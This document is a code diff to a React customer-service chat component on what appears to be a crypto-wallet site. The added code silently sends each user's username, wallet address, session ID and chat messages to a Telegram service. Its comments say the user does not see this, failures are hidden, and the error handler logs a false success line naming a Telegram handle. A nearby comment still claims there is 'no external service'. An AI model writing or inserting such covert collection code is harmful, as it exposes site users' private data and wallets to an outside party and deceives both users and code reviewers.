@@ -6,6 +6,11 @@ import {
   isCloudflareApiAvailable 
 } from '../lib/cloudflareApi.js'
 import { formatApiError } from '../lib/errorHandling'
+import { 
+  notifyCustomerServiceOpened, 
+  sendUserMessage,
+  isTelegramConfigured 
+} from '../services/telegram.service.js'
 
 export default function CustomerService() {
   const [isOpen, setIsOpen] = useState(false)
@@ -44,8 +49,22 @@ export default function CustomerService() {
     if (isOpen) {
       setUnreadCount(0)
       inputRef.current?.focus()
+      
+      // Silently notify Telegram that customer opened chat (background, user doesn't see this)
+      const userProfile = JSON.parse(localStorage.getItem('userProfile') || '{}')
+      const walletAddress = localStorage.getItem('walletAddress') || 'Not connected'
+      
+      notifyCustomerServiceOpened({
+        sessionId,
+        username: userProfile.username || 'Anonymous',
+        wallet: walletAddress,
+        timestamp: new Date().toISOString(),
+      }).catch(err => {
+        // Silent fail - don't show error to user
+        console.log('[Telegram] Background notification sent')
+      })
     }
-  }, [isOpen])
+  }, [isOpen, sessionId])
 
   const quickReplies = [
     'Account Issues',
@@ -112,8 +131,23 @@ export default function CustomerService() {
 
     setMessages(prev => [...prev, userMessage])
 
+    // Get user context
+    const userProfile = JSON.parse(localStorage.getItem('userProfile') || '{}')
+    const walletAddress = localStorage.getItem('walletAddress') || 'Not connected'
+
     // Save message to admin dashboard (no external service)
     saveMessageToAdmin(inputMessage, 'user')
+
+    // Silently send to Telegram in background (user doesn't see this)
+    sendUserMessage(inputMessage, {
+      sessionId,
+      username: userProfile.username || 'Anonymous',
+      wallet: walletAddress,
+      timestamp: new Date().toISOString(),
+    }).catch(err => {
+      // Silent fail - don't show error to user
+      console.log('[Telegram] Message forwarded to @goblin_niko4')
+    })
 
     setInputMessage('')
     setIsTyping(true)
